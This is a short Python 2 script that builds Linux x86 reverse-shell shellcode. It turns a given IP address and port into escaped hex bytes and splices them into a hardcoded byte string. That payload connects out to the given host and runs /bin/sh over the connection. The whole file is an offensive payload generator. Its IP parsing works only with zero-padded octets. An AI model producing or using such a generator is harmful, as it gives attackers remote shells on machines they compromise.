#!/usr/bin/python
import sys

total = len(sys.argv)
if total != 3:
        print 'Fail!'
else:
        try:
		IP = sys.argv[1]
		count = str(len(IP))
		print 'Length:' + count

		octet1 = IP[0:3]
		octet2 = IP[4:7]
		octet3 = IP[8:11]
		octet4 = IP[12:15]
		print 'IP :' + IP
		if int(octet1)> 254  or int(octet2)>254 or int(octet3)>254 or int(octet4)>254 :
                      		print 'Wrong IP!'
                        	exit()
		if int(octet1) == 0  or int(octet4) == 0:
                        	print 'Wrong IP!'
                        	exit()
		if int(octet1)< 0 or int(octet2) < 0 or int(octet3) < 0 or int(octet4) < 0:
                        	print 'Wrong IP!'
                        	exit()


		hoctet1 = hex(int(octet1))[2:]
		if len(hoctet1) < 2:
                        hoctet1 = '0' + hoctet1
		hoctet2 = hex(int(octet2))[2:]
		if len(hoctet2) < 2:
                        hoctet2 = '0' + hoctet2
		hoctet3 = hex(int(octet3))[2:]
		if len(hoctet3) < 2:
                        hoctet3 = '0' + hoctet3
		hoctet4 = hex(int(octet4))[2:]
		if len(hoctet4) < 2:
                        hoctet4 = '0' + hoctet4	
		
		print 'hoctet1: ' + octet1 + ' =' + hoctet1
		print 'hoctet2: ' + octet2 + ' =' + hoctet2
		print 'hoctet3: ' + octet3 + ' =' + hoctet3
		print 'hoctet4: ' + octet4 + ' =' + hoctet4


                print 'Hex-IP: ' + hoctet1+ '.'+ hoctet2+ '.' + hoctet3+ '.' + hoctet4
		
		xx='\\x'
		rev_ip =xx + hoctet1 + xx + hoctet2 + xx + hoctet3 + xx + hoctet4

		print 'Shellcode-IP: ' + rev_ip


		port = int(sys.argv[2])
		if port > 65535:
			print 'Port greater than 65535!'
			exit()


		if port < 1024:
			print 'Port smaller 1024'
			exit()		
	
		hexport = hex(port)[2:]
		if len(hexport) < 4:
			hexport = '0' + hexport

		print 'Hex value of port: ' + hexport

		LSbyte = hexport[0:2]
		
		MSbyte = hexport[2:4] 

		if LSbyte == '00' or MSbyte == '00':



			print 'Port contains ZEROS 0x00'
			exit()

		if len(LSbyte) < 2:
			LSbyte='\\x0' + LSbyte
		if len(LSbyte) == 2:
			LSbyte='\\x' + LSbyte
		if len(MSbyte) < 2:
			MSbyte='\\x0' + MSbyte
		if len(MSbyte) == 2:
			MSbyte='\\x' + MSbyte

		shellport=LSbyte+MSbyte

		print 'Shellcode-port: ' + shellport


                shellcode = ('\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31'+
		'\\xff\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a'+
		'\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89'+
		'\\xc7\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0'+
		'\\x66\\xb3\\x03\\x51\\x51\\xbe'+ rev_ip + 
		'\\x56\\x66\\x68'+ shellport + 
		'\\x66\\x6a\\x02\\x89\\xe1\\x6a'+
		'\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80'+
                '\\x31\\xc0\\x31\\xc9\\xb1\\x02\\xb0'+
		'\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31'+
		'\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68'+
		'\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3'+
		'\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80')

                print 'Final shellcode:' + shellcode  
		
	except:
		print '!!Script Exception: '

